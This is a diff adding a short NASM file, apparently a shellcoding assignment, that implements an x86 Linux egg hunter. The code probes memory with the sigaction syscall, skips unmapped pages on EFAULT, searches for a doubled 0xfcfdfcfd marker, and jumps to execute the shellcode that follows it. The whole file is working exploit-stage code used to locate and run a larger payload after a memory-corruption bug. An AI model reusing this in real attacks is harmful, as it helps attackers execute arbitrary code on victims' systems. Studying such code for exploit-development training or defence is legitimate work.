@@ -1,0 +1,24 @@
+; A3.nasm:
+
+
+global _start:
+section .text
+_start:
+
+alignment:                 ; page alignment 
+     or cx,0xfff
+increment:                 ; next address
+     inc ecx
+     xor eax,eax
+     mov al, 0x43           ; sigaction() syscall
+     int 0x80
+     cmp al,0xf2               ; EFAULT error code
+     je alignment              ; jump in case of invalid address
+     mov eax,0xfcfdfcfd        ; loading the "egg" into eax
+     mov edi,ecx               ; loading the current address into edi
+     scasd                     ; comparing with the first word of "egg"
+     jnz increment             ; jump in case of no matching
+     scasd                     ; comparing with the second word of "egg"
+     jnz increment             ; jump in case of no matching
+     jmp edi                   ; in case of matching "egg", jump unconditionally to execute the "egg" 
+                               ; and the rest of the shellcode
